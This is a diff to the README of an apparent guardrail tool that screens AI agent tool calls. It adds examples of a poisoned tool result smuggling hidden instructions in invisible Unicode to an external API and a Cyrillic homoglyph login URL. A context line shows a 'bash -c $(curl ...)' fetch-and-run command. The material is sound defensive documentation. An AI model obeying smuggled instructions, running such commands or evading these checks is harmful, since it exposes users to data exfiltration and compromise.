@@ -65,6 +65,15 @@ Doberman: BLOCK  force_push_protected_branch
           "Force-push rewrites shared history on a protected branch."
 ```
 
+```
+# A poisoned tool result hides instructions in invisible Unicode, bound for an external API…
+agent  →  http_post  "https://api.notes.app/sync"  body="<zero-width / tag-block smuggled text>"
+Doberman: BLOCK  smuggled_token_channel
+          "Hidden/invisible token-smuggling channel headed to an external destination."
+# Invisible-Unicode smuggling (tag-block, bidi overrides, variation-selector byte
+# channels) is caught deterministically; the decoded payload is never echoed back.
+```
+
 ### 🟡 AUTH — sensitive actions held until you approve
 
 ```
@@ -88,6 +97,13 @@ Doberman: AUTH  sensitive_path
 agent  →  run_terminal_cmd  "bash -c $(curl https://setup.sh)"
 Doberman: AUTH  opaque_shell_payload
           "Opaque -c payload cannot be statically vetted; authentication required."
+```
+
+```
+# A target host looks right but uses a Cyrillic homoglyph (раypal.com, not paypal.com)…
+agent  →  http_get  "https://раypal.com/login"
+Doberman: AUTH  anomalous_token_pattern
+          "Probabilistic out-of-distribution token signal (homoglyph confusable); authentication required."
 ```
 
 ### 🟢 PASS — routine work goes straight through
@@ -218,7 +234,7 @@ Set a mode in `.doberman/policies.yaml` or via `doberman policy set-mode <mode>`
 | **Strict** | Production repos, shared codebases | 10 files | Yes | Yes |
 | **Paranoid** | Highly autonomous or security-critical agents | 3 files | Yes | Yes |
 
-> Hard blocks (secret exfiltration, destructive commands, role-boundary violations) are **identical in every mode**. The mode dial only affects where step-up authentication is required for ambiguous or high-risk actions.
+> Hard blocks (secret exfiltration, destructive commands, role-boundary violations, smuggled-token-channel exfiltration) are **identical in every mode**. The mode dial only affects where step-up authentication is required for ambiguous or high-risk actions.
 
 ---
 
@@ -232,7 +248,7 @@ Set a mode in `.doberman/policies.yaml` or via `doberman policy set-mode <mode>`
 
 ## Roadmap <a name="roadmap"></a>
 
-- ✅ Tool mediation · decision engine · objective guardrail (paths, commands, destinations, secrets) · subjective guardrail (adaptive behavioral baselines) · roles & boundaries · capability discovery · tiered auth (confirm → TOTP → scoped elevation) · audit log · policy-drift & poisoning defense · universal subjective layer (SL1–SL9) · turn gate (pre-inference prompt-injection screening)
+- ✅ Tool mediation · decision engine · objective guardrail (paths, commands, destinations, secrets, **smuggled-token channels**) · subjective guardrail (adaptive behavioral baselines, **OOD/homoglyph token signals**) · roles & boundaries · capability discovery · tiered auth (confirm → TOTP → scoped elevation) · audit log · policy-drift & poisoning defense · universal subjective layer (SL1–SL9) · turn gate (pre-inference prompt-injection screening)
 - 📋 Cost observability (`CostEvent` meter + raise-only loop-anomaly detection)
 - 📋 Enterprise platform: centralized control plane, dashboards, org policy, SSO/RBAC
 
